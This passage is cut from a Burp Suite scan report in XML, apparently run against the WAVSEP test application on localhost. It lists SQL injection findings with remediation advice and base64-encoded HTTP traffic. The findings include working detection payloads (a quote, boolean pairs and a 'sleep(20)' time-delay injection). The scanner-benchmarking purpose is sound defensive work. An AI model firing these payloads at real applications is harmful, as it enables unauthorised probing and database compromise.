      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>325923656946087936</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>70415679 or 2371=02371</b> and <b>87284137 or 3239=3244</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21zZ0lkPTEnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21zZ0lkPTE3MDQxNTY3OSUyMG9yJTIwMjM3MSUzZDAyMzcxIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21zZ0lkPTE4NzI4NDEzNyUyMG9yJTIwMzIzOSUzZDMyNDQgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21zZ0lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7250522082813878272</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the minBalanace parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>75771587 or 7040=07040</b> and <b>45211163 or 8535=8537</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20013</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
